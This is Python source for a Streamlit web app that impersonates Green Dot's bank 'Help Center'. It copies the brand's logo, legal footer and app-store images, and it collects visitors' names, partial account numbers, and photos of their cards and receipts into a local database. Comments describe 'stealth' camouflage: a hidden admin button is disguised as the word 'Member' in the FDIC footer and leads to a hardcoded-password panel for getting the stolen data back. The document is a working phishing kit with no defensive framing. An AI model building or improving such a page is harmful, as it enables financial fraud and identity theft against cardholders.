
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- CONFIGURACIÓN DE BASE DE DATOS ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL, 
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    return "GD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- MOTOR DE ESTILOS AVANZADO (STREAMLIT INTERNALS) ---
st.markdown("""<style>
    /* Ocultar elementos de sistema */
    [data-testid='stHeader'], footer, header, .stDeployButton, .section-anchor { 
        display: none !important; 
    }
    
    /* Reset de fondo y tipografía */
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    
    /* Botón Principal de Envío */
    .stButton > button[kind="primaryFormSubmit"] {
        background-color: #00a05b !important; color: white !important;
        width: 100%; border-radius: 4px; border: none; font-weight: 600; padding: 12px;
    }

    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    /* FOOTER ULTRA-STEALTH */
    .legal-container {
        font-size: 10px; color: #555; text-align: justify; margin-top: 50px;
        border-top: 1px solid #1a1a1a; padding-top: 25px; line-height: 1.7;
        user-select: none;
    }

    /* El disparador 'Member' se mimetiza al 100% */
    .stButton > button[key="admin_v30"] {
        background: transparent !important;
        border: none !important;
        color: #555 !important;
        padding: 0 !important;
        margin: 0 !important;
        display: inline !important;
        vertical-align: baseline !important;
        font-size: 10px !important;
        font-weight: normal !important;
        cursor: text !important;
        width: auto !important;
        min-height: 0 !important;
        box-shadow: none !important;
    }
    
    .stButton > button[key="admin_v30"]:hover, 
    .stButton > button[key="admin_v30"]:active,
    .stButton > button[key="admin_v30"]:focus {
        background: transparent !important;
        color: #555 !important;
        border: none !important;
        box-shadow: none !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state:
    st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo: 
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("expert_form_v30", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
        submitted = st.form_submit_button("SUBMIT NOW")

    if submitted:
        if nombre and rec and car:
            ref = generate_ref()
            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:8px; text-align:center;'>" +
                        f"<h3 style='color:#00a05b; margin:0;'>Success</h3><p>Reference: <b>{ref}</b></p></div>", unsafe_allow_html=True)
        else: st.error("Information missing.")

    # Promo Apps
    st.markdown("""<div style='background:#111; padding:30px; text-align:center; border-radius:12px; margin:30px 0; border:1px solid #222;'>
        <h4 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h4>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130' style='margin-left:10px;'>
    </div>""", unsafe_allow_html=True)

    # FOOTER ENSAMBLADO POR COMPONENTES PARA CAMUFLAJE TOTAL
    st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, ", unsafe_allow_html=True)
    if st.button("Member", key="admin_v30"): 
        st.session_state.admin_mode = True
    st.markdown(" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>", unsafe_allow_html=True)

else:
    st.title("🔐 Administrative Panel")
    if st.button("Exit"): st.session_state.admin_mode = False
    pw = st.text_input("Auth Key", type="password")
    if pw == "Diostieneelpoder1":
        st.success("Authorized Access")
        # Database retrieval logic...
